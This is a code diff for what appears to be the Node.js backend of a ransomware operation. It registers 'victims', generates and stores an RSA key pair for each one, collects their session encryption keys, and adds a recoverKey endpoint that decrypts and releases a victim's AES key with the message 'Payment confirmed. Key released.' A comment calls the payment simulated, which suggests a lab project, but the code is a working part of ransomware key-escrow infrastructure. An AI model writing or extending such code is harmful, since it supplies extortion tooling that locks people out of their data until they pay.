@@ -1,7 +1,7 @@
-import { randomUUID, generateKeyPairSync } from 'crypto';
+import { randomUUID, generateKeyPairSync, privateDecrypt, constants } from 'crypto';
 import db from '../config/db.js';
 
-// Helper function (Used by AuthController too)
+// Helper: Create Victim Identity with RSA Keys
 export const createVictimIdentity = (ip) => {
     const clientId = randomUUID();
     console.log(`[Backend] Generating keys for: ${clientId}`);
@@ -19,10 +19,8 @@ export const createVictimIdentity = (ip) => {
     return { clientId, publicKey, privateKey };
 };
 
-// --- Controllers ---
-
+// Controller: New Victim Registration
 export const newVictim = (req, res) => {
-    // Legacy endpoint (if needed without login)
     const identity = createVictimIdentity(req.ip);
     res.status(201).json({ clientId: identity.clientId, publicKey: identity.publicKey });
 };
@@ -44,4 +42,51 @@ export const reportSessionKey = (req, res) => {
             res.status(201).json({ stored: true });
         }
     );
+};
+
+// Controller: Recover Key (Simulates Payment & Key Retrieval)
+export const recoverKey = (req, res) => {
+    const { clientId } = req.body;
+    if (!clientId) return res.status(400).json({ error: 'Missing Client ID' });
+
+    // 1. Find the latest session key and the victim's private key
+    const query = `
+        SELECT s.key as encrypted_aes, v.private_key 
+        FROM session_keys s
+        JOIN victims v ON s.client_id = v.client_id
+        WHERE s.client_id = ?
+        ORDER BY s.id DESC LIMIT 1
+    `;
+
+    db.get(query, [clientId], (err, row) => {
+        if (err) return res.status(500).json({ error: "Database error" });
+        if (!row) return res.status(404).json({ error: "No record found. Did you finish encryption?" });
+
+        try {
+            // 2. Decrypt the AES key using the stored Private Key
+            const privateKey = row.private_key;
+            const encryptedBuffer = Buffer.from(row.encrypted_aes, 'base64');
+
+            const rawAesKey = privateDecrypt(
+                {
+                    key: privateKey,
+                    padding: constants.RSA_PKCS1_PADDING,
+                },
+                encryptedBuffer
+            );
+
+            console.log(`[Backend] Recovering keys for ${clientId}`);
+
+            // 3. Send the RAW AES key back to the victim
+            res.json({ 
+                success: true, 
+                key: rawAesKey.toString('base64'),
+                message: "Payment confirmed. Key released."
+            });
+
+        } catch (e) {
+            console.error("Decryption error:", e);
+            res.status(500).json({ error: "Server failed to decrypt key." });
+        }
+    });
 };
